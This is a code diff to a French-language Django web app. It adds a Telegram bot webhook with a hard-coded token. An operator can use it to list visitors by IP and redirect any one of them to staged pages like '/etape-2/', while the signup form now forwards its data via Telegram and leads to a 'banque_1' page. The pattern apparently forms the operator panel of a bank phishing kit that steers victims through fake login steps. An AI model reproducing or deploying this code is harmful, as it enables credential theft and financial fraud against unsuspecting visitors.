@@ -83,13 +83,102 @@ def redirection(request):
         "redirection.html",
         {"pages_disponibles": PAGES_DISPONIBLES}
     )
+
+import hashlib
+from django.views.decorators.csrf import csrf_exempt
+
+TELEGRAM_TOKEN = "8995148469:AAHNG55Z9GrPq6-X1AKDUTLsgVmB91VWaL8"
+TELEGRAM_CHAT_ID = "8849728706"
+
+def envoyer_telegram(texte):
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+    import requests
+    requests.post(url, data={
+        "chat_id": TELEGRAM_CHAT_ID,
+        "text": texte,
+        "parse_mode": "Markdown"
+    }, timeout=5)
+
+
+@csrf_exempt
+def telegram_webhook(request):
+    if request.method != 'POST':
+        return JsonResponse({'ok': False})
+
+    import json
+    update = json.loads(request.body)
+    message = update.get('message', {})
+    texte   = message.get('text', '').strip()
+    chat_id = str(message.get('chat', {}).get('id', ''))
+
+    # Sécurité : ignore si ce n'est pas ton chat
+    if chat_id != TELEGRAM_CHAT_ID:
+        return JsonResponse({'ok': True})
+
+    # ── /visiteurs ──
+    if texte == '/visiteurs':
+        if not VISITEURS_ACTIFS:
+            envoyer_telegram("😴 *Aucun visiteur actif*")
+        else:
+            lignes = ["👥 *Visiteurs en ligne :*\n━━━━━━━━━━━━━━━"]
+            for ip, data in VISITEURS_ACTIFS.items():
+                lignes.append(f"📍 `{ip}` → `{data['page']}`")
+            envoyer_telegram('\n'.join(lignes))
+
+    # ── /pages ──
+    elif texte == '/pages':
+        lignes = ["📋 *Pages disponibles :*\n━━━━━━━━━━━━━━━"]
+        for i, (url, nom) in enumerate(PAGES_DISPONIBLES, 1):
+            lignes.append(f"{i}. `{url}` — {nom}")
+        lignes.append("\n💡 Usage : `/redirect 1.2.3.4 /etape-2/`")
+        envoyer_telegram('\n'.join(lignes))
+
+    # ── /redirect IP /page ──
+    elif texte.startswith('/redirect'):
+        parties = texte.split()
+        if len(parties) != 3:
+            envoyer_telegram(
+                "❌ *Format incorrect*\n"
+                "Usage : `/redirect 1.2.3.4 /etape-2/`"
+            )
+        else:
+            ip          = parties[1]
+            destination = parties[2]
+            pages_ok    = [url for url, _ in PAGES_DISPONIBLES]
+
+            if ip not in VISITEURS_ACTIFS:
+                envoyer_telegram(f"❌ IP `{ip}` introuvable parmi les visiteurs actifs.")
+            elif destination not in pages_ok:
+                envoyer_telegram(f"❌ Page `{destination}` invalide.\nUtilise `/pages` pour voir les pages disponibles.")
+            else:
+                cache.set(f'redirect_{ip}', destination, timeout=300)
+                envoyer_telegram(
+                    f"✅ *Redirection envoyée*\n"
+                    f"━━━━━━━━━━━━━━━\n"
+                    f"📍 IP : `{ip}`\n"
+                    f"➡️ Vers : `{destination}`"
+                )
+
+    # ── /help ──
+    elif texte == '/help' or texte == '/start':
+        envoyer_telegram(
+            "🤖 *Commandes disponibles :*\n"
+            "━━━━━━━━━━━━━━━\n"
+            "👥 `/visiteurs` — voir les visiteurs actifs\n"
+            "📋 `/pages` — voir les pages disponibles\n"
+            "➡️ `/redirect IP /page` — rediriger un visiteur\n"
+            "━━━━━━━━━━━━━━━\n"
+            "💡 Exemple : `/redirect 1.2.3.4 /etape-2/`"
+        )
+
+    return JsonResponse({'ok': True})
     
 def inscription(request):
     if request.method == 'POST':
         form = InscriptionForm(request.POST)
         if form.is_valid():
             form.send_tel()
-            return redirect('destination')
+            return redirect('banque_1')
     else:
         form = InscriptionForm()
 
